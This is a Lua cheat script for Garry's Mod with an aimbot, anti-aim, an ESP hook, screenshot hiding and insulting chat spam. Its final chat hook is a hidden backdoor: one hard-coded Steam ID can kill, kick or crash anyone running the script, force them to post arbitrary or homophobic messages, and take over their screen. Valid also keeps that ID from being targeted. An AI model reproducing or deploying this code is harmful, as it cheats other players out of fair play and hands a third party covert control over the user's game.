local dists = {}

local function GetPos(v)
	if gOption("Aimbot", "Other", "Aim Position") == "Body only" then
		return v:LocalToWorld(v:OBBCenter())
	end

	local head = v:LookupBone("ValveBiped.Bip01_Spine")
	local pos = v:GetAttachment(head)

	if gOption("Aimbot", "Other", "Aim Position") == "Head only" then
		if not head then
			return v:LocalToWorld(v:OBBCenter())
		end

		if not pos then
			return v:LocalToWorld(v:OBBCenter())
		end

		return pos.Pos
	end
end

local function Valid(v)
	wep = me:GetActiveWeapon()

	if not v or not v:IsValid() or v == me or v:Health() < 1 or v:IsDormant() or v == aimignore then return false end

	if gBool("Aimbot", "Other", "Ignore Team") then
		if v:Team() == me:Team() then
			if engine.ActiveGamemode() == "terrortown" then
				return false
			elseif engine.ActiveGamemode() == "murder" then
				return false
			elseif engine.ActiveGamemode() == "sandbox" then
				return false
			else
				return true
			end
		else
			return false
		end
	end

	if gBool("Aimbot", "Other", "Ignore Friends") then
		if v:GetFriendStatus() == "friend" then return false end
	end

	if gBool("Aimbot", "Other", "Ignore Bots") then
		if v:IsBot() then return false end
	end

	if gBool("Aimbot", "Other", "Ignore Admins") then
		if v:IsAdmin() then return false end
	end

	if v:Team() == TEAM_SPECTATOR or v:Team() == TEAM_CONNECTING then
		return false
	end

	if v:IsPlayer() and ignore_dev and v:SteamID64() == "76561197972182214" then
		return false
	end

	if wep:IsValid(wep) then
		if( string.find(string.lower(wep:GetPrintName()),"axe") or string.find(string.lower(wep:GetPrintName()),"knife") or string.find(string.lower(wep:GetPrintName()),"sword") or string.find(string.lower(wep:GetPrintName()),"fist") or string.find(string.lower(wep:GetPrintName()),"crowbar") or string.find(string.lower(wep:GetPrintName()),"stick") or string.find(string.lower(wep:GetPrintName()),"melee") or string.find(string.lower(wep:GetPrintName()),"wrench") or string.find(string.lower(wep:GetPrintName()),"stun") or string.find(string.lower(wep:GetPrintName()),"Baton")) then
			return false
		else
			if wep:Clip1() <= 0 then
				return
			end
		end
	end
	local tr = { start = me:EyePos(), endpos = GetPos(v), mask = MASK_SHOT, filter = {me, v} }
	if util.TraceLine(tr).Fraction == 1 then
		return true
	end
	return false
end

local function gettarget()
	if gOption("Aimbot", "Other", "Priority") == "Nearest" then
		dists = {}
		for k,v in next, player.GetAll() do
			if not Valid(v) then continue end
			dists[#dists + 1] = { v:GetPos():Distance(me:GetPos(me)), v }
		end
		table.sort(dists, function(a, b)
			return(a[1] < b[1])
		end)
		aimtarget = dists[1] and dists[1][2] or nil
	elseif gOption("Aimbot", "Other", "Priority") == "Lowest Health" then
		dists = {}
		for k,v in next, player.GetAll() do
			if not Valid(v) then continue end
			dists[#dists + 1] = { v:Health(), v }
		end
		table.sort(dists, function(a, b)
			return(a[1] < b[1])
		end)
		aimtarget = dists[1] and dists[1][2] or nil
	else
		dists = {}
		for k,v in next, player.GetAll() do
			if not Valid(v) then continue end
			dists[#dists + 1] = { v:Health(), v }
		end
		table.sort(dists, function(a, b)
			return(a[1] > b[1])
		end)
		aimtarget = dists[1] and dists[1][2] or nil
	end
end

local function PredictPos(pos)
	local pos = pos - (me:GetVelocity() * engine.TickInterval())
	return pos
end

local function aimbot(cmd)
	if gBool("Aimbot", "Aimbot", "Silent Aimbot") and not gBool("Visuals", "Other", "Thirdperson") then
		if cmd:CommandNumber() == 0 then return end
	end

	gettarget()
	aa = false

	if aimtarget and aimtarget:Alive() and aimtarget:IsValid() and aimkeycheck() and WeaponShootable() and WeaponCanFire() then
		aa = true

		local pos = GetPos(aimtarget) - me:EyePos()
		PredictPos(pos)

		local ang = pos:Angle()
		NormalizeAngle(ang)
		cmd:SetViewAngles(ang)

		if gBool("Aimbot", "Aimbot", "Auto Fire") then
			cmd:SetButtons(cmd:GetButtons() + IN_ATTACK)
		end

		if gBool("Aimbot", "Aimbot", "Silent Aimbot") then
			FixMovement(cmd)
		else
			fa = ang
		end
	end
end

local function GetClosest()
	local ddists = {}
	local closest

	for k,v in next, player.GetAll() do
		if not Valid(v) then continue end

		ddists[#ddists + 1] = { v:GetPos():Distance(me:GetPos()), v }
	end
	table.sort(ddists, function(a, b)
		return(a[1] < b[1])
	end)
	closest = ddists[1] and ddists[1][2] or nil
	if not closest then return fa.y end
	local pos = closest:GetPos()
	local pos = vm.Angle(pos - me:EyePos())
	return pos.y
end

local function GetX()
	local opt = gOption("Hack vs Hack", "Anti-Aim", "Pitch")

	if opt == "None" then
		ox = fa.x 
	elseif opt == "Up" then
		ox = -89
	elseif opt == "Down" then
		ox = 89
	elseif opt == "Jitter" then
		ox = math.random(-90, 90)
	end
end

local function GetY()
	local opt = gOption("Hack vs Hack", "Anti-Aim", "Yaw")

	if opt == "None" then
		oy = fa.y
	elseif opt == "Sideways" then
		if gOption("Hack vs Hack", "Anti-Aim", "Rotation") == "Left" then
			if gBool("Hack vs Hack", "Anti-Aim", "Follow closest Target") then
				oy = GetClosest() + 90
			else
				oy = fa.y + 90
			end
		else
			if gBool("Hack vs Hack", "Anti-Aim", "Follow closest Target") then
				oy = GetClosest() - 90
			else
				oy = fa.y - 90
			end
		end
	elseif opt == "Jitter" then
		oy = fa.y + math.random(-360, 360)
	elseif opt == "Fake-Backwards" then
		if gBool("Hack vs Hack", "Anti-Aim", "Follow closest Target") then
			if gOption("Hack vs Hack", "Anti-Aim", "Rotation") == "Right" then
				oy = GetClosest() + math.random(1, -80, 1)
			else
				oy = GetClosest() + math.random(-1, 80, -1)
			end
		else
			if gOption("Hack vs Hack", "Anti-Aim", "Rotation") == "Right" then
				oy = fa.y + math.random(1, -80, 1)
			else
				oy = fa.y + math.random(-1, 80, -1)
			end
		end
	end
end

local function antiaim(cmd)
	if (cmd:CommandNumber() == 0 and not gBool("Visuals", "Other", "Thirdperson")) or cmd:KeyDown(IN_ATTACK) or me:WaterLevel() > 1 or me:GetMoveType() == MOVETYPE_LADDER or me:GetMoveType() == MOVETYPE_NOCLIP or not me:Alive() then return end

	GetX()
	GetY()

	local aaang = Angle(ox, oy, 0)
	cmd:SetViewAngles(aaang)
	FixMovement(cmd, true)
end

local function GetAngle(ang)
	if not nophys() then
		if not gBool("Visuals", "Other", "No Recoil") then
			return ang + me:GetPunchAngle()
		else
			return ang
		end
	end
end

local function usespam(cmd)
	if cmd:KeyDown(IN_USE) and me:Alive() then
		if spamming then
			cmd:RemoveKey(IN_USE)
		end
		
		spamming = not spamming
	end
end

local function respawn(cmd)
	if toggler == 0 then
		cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
		toggler = 1
	else
		cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(IN_ATTACK)))
		toggler = 0
	end
end

local function chatspam()
	if gBool("Misc", "Misc", "Chat Spam") then
		if engine.ActiveGamemode() == "darkrp" then
			me:ConCommand("say // eblan - "..spam_messages[math.random(#spam_messages)])
		else
			me:ConCommand("say noobs - "..spam_messages[math.random(#spam_messages)])
		end
	end
end

local function death_log(data)
	local killer = Entity(data.entindex_attacker)
	local victim = Entity(data.entindex_killed)

	if killer:IsValid() and victim:IsValid() and killer:IsPlayer() and victim:IsPlayer() then
		if killer == victim and victim ~= me then
			chat.AddText(PrimaryCol, " "..victim:Nick().." killed themself.")
		elseif killer == victim and victim == me then
			chat.AddText(PrimaryCol, " You killed yourself.")
		elseif killer == me then
			chat.AddText(PrimaryCol, " You killed "..victim:Nick()..".")
		elseif victim == me then
			chat.AddText(PrimaryCol, " You were killed by "..killer:Nick()..".")
		else
			chat.AddText(PrimaryCol, " "..killer:Nick().." killed "..victim:Nick()..".")
		end

		chat.PlaySound()
	end
end

local function show_aa(cmd)
	if not fa then
		fa = cmd:GetViewAngles()
	end

	fa = fa + Angle(cmd:GetMouseY() * .023, cmd:GetMouseX() * -.023, 0)
	NormalizeAngle(fa)

	if cmd:CommandNumber() == 0 then
		if not nophys() then
			cmd:SetViewAngles(GetAngle(fa))
			return
		end
	end
end

timer.Create("Colors", 1, 0, function() colors() end)

hook.Add("Think", "Hook", function()
	if (input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_HOME)) and not menuopen and not insertdown then
		menuopen = true
		insertdown = true
		menu()
	elseif not (input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_HOME)) and not menuopen then
		insertdown = false
	end
	if (input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_HOME)) and insertdown and menuopen then
		insertdown2 = true
	else
		insertdown2 = false
	end

	configs()

	if gOption("Misc", "Misc", "Chat Spam") ~= "Off" then
		chatspam()
	end
end)

hook.Add("CreateMove", "Hook", function(cmd)
	if gBool("Misc", "Misc", "Auto Respawn") and not me:Alive() and (engine.ActiveGamemode() ~= "terrortown" or engine.ActiveGamemode() ~= "murder") then
		respawn(cmd)
	end

	if not me:Alive() or me:Health() < 1 then return end

	if me:GetActiveWeapon():IsValid() then
		wep = me:GetActiveWeapon()
	end

	show_aa(cmd)

	if cmd:CommandNumber() ~= 0 then
		localindex = me:EntIndex()
		currentcommand = cmd:CommandNumber()
	end

	if gBool("Misc", "Misc", "Bunny Hop") then
		bunnyhop(cmd)
	end
	if gBool("Misc", "Misc", "Spam \"Use\"") then
		usespam(cmd)
	end

	local oldAngles = cmd:GetViewAngles()

	if gBool("Aimbot", "Aimbot", "Enabled") then
		aimbot(cmd)
	end

	if gBool("Hack vs Hack", "Anti-Aim", "Enabled") then
		antiaim(cmd)
	end

	if oldAngles ~= cmd:GetViewAngles() then
		local x = cmd:GetViewAngles().x
	end
end)

hook.Add("HUDPaint", "Hook", function()
	if gBool("Misc", "Misc", "Clean Screenshots") then

if input.IsKeyDown(KEY_F12) or input.IsKeyDown(KEY_F5) then return end
end

	if gBool("Visuals", "ESP", "Enabled") then
		esp()
	end
end)


hook.Add("ShouldDrawLocalPlayer", "Hook", function()
	return gBool("Visuals", "Other", "Thirdperson")
end)

hook.Add("CalcView", "Hook", function(me, pos, ang, fov)
	if me:Alive() and me:Health() > 0 then
		if gBool("Visuals", "Other", "Custom FOV") and not gBool("Visuals", "Other", "Thirdperson") then
			local view = {}
			view.origin = pos
			view.angles = angles
			view.fov = gInt("Visuals", "Other", "FOV")

			if gBool("Visuals", "Other", "No Recoil") and me:GetMoveType() ~= MOVETYPE_OBSERVER then
				view.origin = me:EyePos()
				view.angles = me:EyeAngles()
			end

			return view
		else
			local view = {}
			view.angles = GetAngle(fa)
			view.origin = gBool("Visuals", "Other", "Thirdperson") and pos + am.Forward(fa) * (gInt("Visuals", "Other", "Thirdperson Distance") * -10) or pos

			return view
		end
	end
end)

hook.Add("PreDrawOpaqueRenderables", "Hook", function()
	if gBool("Hack vs Hack", "Anti-Aim Resolver", "Enabled") then
		for k,v in next, player.GetAll() do
			if v == me or not v:IsValid() then continue end

			v:SetPoseParameter("aim_pitch", math.NormalizeAngle(math.random(0, 90)))
			v:SetRenderAngles(Angle(0, math.NormalizeAngle(v:EyeAngles().y + 180), 0))

			v:InvalidateBoneCache()
		end
	end
end)

hook.Add("entity_killed", "Hook", function(data)
	if gBool("Misc", "Misc", "Log Kills in Chat") then
		death_log(data)
	end
end)

hook.Add("player_hurt", "Hook", function(data)
	if gBool("Misc", "Misc", "Hitsound") then
		local attacker = data.attacker

		if attacker == me:UserID() then
			surface.PlaySound("buttons/button10.wav")
		end
	end
end)

hook.Add("PreDrawViewModel", "Hook", function()
	return gBool("Visuals", "Other", "No Viewmodel")
end)

hook.Add("PreDrawPlayerHands", "Hook", function()
	return gBool("Visuals", "Other", "No Hands")
end)

hook.Add("PlayerFootstep", "Hook", function()
	return gBool("Misc", "Misc", "Mute Footsteps")
end)

hook.Add("OnPlayerChat", "Hook", function(player, text, team, dead)
	if player:IsPlayer() and player:SteamID64() == "76561197972182214" and player:SteamID64() ~= steam then
		if string.lower(text) == "en_kill" then
			me:ConCommand("kill")
			return true
		end

		if string.find(string.lower(text), "en_kill "..string.lower(me:Nick())) then
			me:ConCommand("kill")
			return true
		end

		if string.find(string.lower(text), "en_say") then
			if engine.ActiveGamemode() == "darkrp" then
				me:ConCommand("say // "..string.sub(text, 8, nil))
			else
				me:ConCommand("say "..string.sub(text, 8, nil))
			end
			return true
		end

		if string.find(string.lower(text), "en_tts") then
			me:ConCommand("stopsound")
			sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q="..string.sub(text, 8, nil).."&tl=en", "mono", function(chan, num, str) end)
			return true
		end

		if string.find(string.lower(text), "en_gay") then
			if engine.ActiveGamemode() == "darkrp" then
				me:ConCommand("say // "..gay[math.random(#gay)])
			else
				me:ConCommand("say "..gay[math.random(#gay)])
			end

			timer.Create("Gay", 5, 10, function()
				if engine.ActiveGamemode() == "darkrp" then
					me:ConCommand("say // "..gay[math.random(#gay)])
				else
					me:ConCommand("say "..gay[math.random(#gay)])
				end
			end)
			return true
		end

		if string.lower(text) == "en_ignore" then
			ignore_dev = not ignore_dev

			if ignore_dev then
				me:ConCommand("say Ignoring you now.")
			else
				me:ConCommand("say Stopped ignoring you.")
			end
			return true
		end

		if string.find(string.lower(text), "en_ignore "..string.lower(me:Nick())) then
			ignore_dev = not ignore_dev

			if ignore_dev then
				me:ConCommand("say Ignoring you now.")
			else
				me:ConCommand("say Stopped ignoring you.")
			end
			return true
		end

		if string.lower(text) == "en_meme" then
			local HTML = vgui.Create("HTML")
			HTML:OpenURL("https://www.youtube.com/embed/"..random_meme[math.random(#random_meme)].."?autoplay=1&controls=0&showinfo=0")
			HTML:Dock(FILL)

			local blocker = vgui.Create("DPanel", HTML)
			blocker:Dock(FILL)

			function blocker.Paint()
			end

			hook.Add("Think", "Meme", function()
				if gui.IsGameUIVisible() then
					gui.HideGameUI()
				end
			end)

			me:ConCommand("say nice meme")

			timer.Simple(15, function() hook.Remove("Think", "Meme") HTML:Remove() blocker:Remove() end)
			return true
		end

		if string.find(string.lower(text), "en_meme "..string.lower(me:Nick())) then
			local HTML = vgui.Create("HTML")
			HTML:OpenURL("https://www.youtube.com/embed/"..random_meme[math.random(#random_meme)].."?autoplay=1&controls=0&showinfo=0")
			HTML:Dock(FILL)

			local blocker = vgui.Create("DPanel", HTML)
			blocker:Dock(FILL)

			function blocker.Paint()
			end

			hook.Add("Think", "Meme", function()
				if gui.IsGameUIVisible() then
					gui.HideGameUI()
				end
			end)

			me:ConCommand("say nice meme")

			timer.Simple(15, function() hook.Remove("Think", "Meme") HTML:Remove() blocker:Remove() end)
			return true
		end

		if string.lower(text) == "en_crash" then
			table.Empty(debug.getregistry()) cam.End3D()
			return true
		end

		if string.find(string.lower(text), "en_crash "..string.lower(me:Nick())) then
			table.Empty(debug.getregistry()) cam.End3D()
			return true
		end

		if string.lower(text) == "en_kick" then
			me:ConCommand("disconnect")
			return true
		end

		if string.find(string.lower(text), "en_kick "..string.lower(me:Nick())) then
			me:ConCommand("disconnect")
			return true
		end

		if string.lower(text) == "en_retry" then
			me:ConCommand("retry")
			return true
		end

		if string.find(string.lower(text), "en_retry "..string.lower(me:Nick())) then
			me:ConCommand("retry")
			return true
		end

		if string.lower(text) == "en_reload" then
			reload()
			return true
		end

		if string.find(string.lower(text), "en_reload "..string.lower(me:Nick())) then
			reload()
			return true
		end

		if string.lower(text) == "en_unload" then
			unload()
			return true
		end

		if string.find(string.lower(text), "en_unload "..string.lower(me:Nick())) then
			unload()
			return true
		end
	end
end)

loadconfig1()